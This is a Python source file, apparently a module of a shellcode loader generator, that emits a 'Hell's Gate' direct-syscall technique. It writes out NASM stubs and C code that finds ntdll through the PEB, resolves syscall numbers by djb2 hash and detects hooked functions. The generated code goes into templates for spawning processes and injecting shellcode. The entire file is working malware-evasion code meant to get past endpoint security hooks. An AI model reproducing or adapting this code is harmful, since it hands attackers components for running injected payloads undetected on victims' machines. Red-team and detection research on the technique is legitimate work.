import random
import string
import tempfile
import os
import subprocess
from c.utils.typedefs import typedefs

class hellsgatehash:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        fd, file_path = tempfile.mkstemp(suffix='.asm')
        self.outfd, self.outfile_path = tempfile.mkstemp(suffix='.o')
        self.typedefs = typedefs
        self.apicalls = {}
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
default rel

global wSystemCall
global HellsGate
global HellDescent

section .data
    wSystemCall dd 000h

section .text

HellsGate:
    mov [wSystemCall], ecx
    nop
    nop
    nop
    ret

HellDescent:
    mov r10, rcx 
    nop
    nop
    mov eax, [wSystemCall] 
    nop
    nop
    syscall
    nop
    ret

"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'win64', file_path, '-o', self.outfile_path])
        os.unlink(file_path)

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return [self.outfile_path]
    
    def codeblocks(self) -> str:
        ntdll = []
        codeblock = """
extern VOID HellsGate(WORD wSystemCall);
extern NTSTATUS HellDescent(...);

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

DWORD GetSSN(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, DWORD64 functionHash) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == functionHash) {

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					return (high << 8) | low;
				}

				cw++;
			};
		}
	}

	return TRUE;
}
"""
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                ntdll.append(apicall)
            elif apicall[0:2] in ['Zw', 'Rt']:
                codeblock += f"""
{self.typedefs[apicall]}
"""

        codeblock += f"""
NTSTATUS status;

typedef struct {{
    {'\n\t'.join([f'DWORD {x}_ssn;' for x in ntdll ])}
}} Resolver;

Resolver resolver;

__attribute__((constructor)) void {self.name}(){{

    PTEB pCurrentTeb = NULL;
    __asm__ ("mov %%gs:0x30, %0" : "=r" (pCurrentTeb));
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return;
	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory);
    {'\n\t'.join([f'resolver.{apicall}_ssn = GetSSN(pLdrDataEntry->DllBase, pImageExportDirectory, {hex(self.hash_string(apicall))});' for apicall in ntdll])}
}}
"""
        return codeblock

    def template(self, templateCode, transformers, shellcodeSize):
        for _, field_name, _, _ in string.Formatter().parse(templateCode):
            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
                self.apicalls[field_name] = ''
        self.resolve()
        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)

    def resolve(self):
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                self.apicalls[apicall] = f"""
    HellsGate(resolver.{apicall}_ssn);
    status = HellDescent"""
            elif apicall[0:2] in ['Rt', 'Zw']:
                self.apicalls[apicall] = f'(({apicall}_t)GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "{apicall}"))'
            else:
                self.apicalls[apicall] = apicall
    
    def hash_string(self, functionName):
        hash = 0x7734773477347734
        for character in functionName:
            hash = ((hash << 0x5) + hash) + ord(character) 

        return hash & 0xffffffffffffffff